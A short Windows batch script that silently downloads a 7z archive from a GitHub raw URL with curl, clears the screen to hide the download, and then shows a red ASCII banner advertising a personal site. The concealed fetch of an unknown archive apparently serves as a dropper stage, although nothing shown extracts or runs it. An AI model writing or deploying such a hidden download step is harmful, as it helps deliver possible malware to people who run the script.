@echo off
for /F "delims=#" %%E in ('"prompt #$E# & for %%E in (1) do rem"') do set "esc=%%E"
set "URL=https://github.com/bigpluggssd/bye-Bye/raw/refs/heads/main/download/proj.7z"
set "OUTPUT_FILE=proj.7z"
curl -L -o "%OUTPUT_FILE%" "%URL%"
cls
echo %esc%[31m\====================================================/%esc%[0m
echo %esc%[31m \==================================================/ %esc%[0m
echo %esc%[31m  \==my sate - bigpluggssd.github.io/fdrftyujbvcd==/  %esc%[0m
echo %esc%[31m   \==============================================/   %esc%[0m
echo %esc%[31m    \============================================/    %esc%[0m
pause
